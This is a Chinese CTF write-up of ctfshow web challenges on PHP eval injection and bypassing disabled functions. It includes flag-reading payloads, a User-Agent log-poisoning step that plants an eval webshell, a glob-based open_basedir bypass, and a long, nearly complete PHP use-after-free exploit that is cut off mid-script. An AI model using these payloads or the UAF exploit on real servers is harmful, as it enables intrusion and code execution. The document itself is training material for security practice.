题目描述**命令执行，突破禁用函数**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>题目描述变成突破禁用函数，常规思路是查看phpinfo()看具体禁用了哪些函数，但发现phpinfo也被禁用了，再经过尝试发现禁用了`system()`、`echo shell_exec()`、`renmae`尝试到`file_get_contents()`未被禁用，猜测flag在`flag.php`中或可以使用函数查看目录`c=print_r(scandir("."));`payload:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=echo file_get_contents(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>在59题中，源码未变，但过滤的肯定更多，测试发现`file_get_contents()`果然被禁用我们还可以使用`include`<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include($_GET[1]);</span><br><span class="line">?1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>思路还有很多很多，`c=highlight_file("flag.php");`    `c=show_source('flag.php');`  `c=include('flag.php');echo $flag;`    `c=include('flag.php');var_dump(get_defined_vars());`> flag不一定在flag.php中，可以用c=print_r(scandir("."));遍历目录寻找flag位置**一种无法命令执行时写shell的方式**更改UA头为：`<?php eval($_POST[a]); ?>`将木马写入日志里<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=/var/log/nginx/access.log</span><br><span class="line">c=include($_GET[1]);&amp;a=</span><br></pre></td></tr></table></figure><h2 id="68-70-web68-70">68-70.web68-70</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>打开题目显示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">highlight_file</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">19</span></span><br></pre></td></tr></table></figure><p>很明显最常用的<code>highlight_file()</code>函数已经被禁用<br>根据上题经验，尝试参数c传参<br>查看目录函数和文件包含仍可使用<br>payload：<code>c=include('/flag.txt');</code></p><h2 id="71-web71">71.web71</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>附件中给出了php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>其中先把缓存区内容读取到s中，清空缓存区，再将s中数字字母替换为？输出<br>导致报错及有用信息不可见<br>我们执行<code>eval()</code>函数后退出即可<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h2 id="72-web72">72.web72</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>源代码和上题一样，利用上题payload白嫖发现include找不到文件<br>包含当前文件下的<strong>flag.php</strong>并输出flag试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="keyword">echo</span> <span class="variable">$flag</span>;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># 秀秀得了,这次不在这里</span></span><br></pre></td></tr></table></figure><p>判断又更改了flag位置<br>利用常用的<code>scandir()</code>函数读取目录发现报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">scandir</span>(): open_basedir restriction in effect. <span class="title function_ invoke__">File</span>(/) is not within the allowed <span class="title function_ invoke__">path</span>(s): (/<span class="keyword">var</span>/www/html/) in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/index.php(19) : eval()&#x27;</span>d code on line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">scandir</span>(): (errno <span class="number">1</span>): Operation not permitted in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 1</span></span><br></pre></td></tr></table></figure><p>原因是open_basedir限制<br>利用glob协议目录读取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span></span><br></pre></td></tr></table></figure><p>可以看到flag应该就在flag0.txt中<br>尝试<code>include()</code>发现仍然被open_basedir限制，使用uaf脚本绕过**(原理未知)**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ 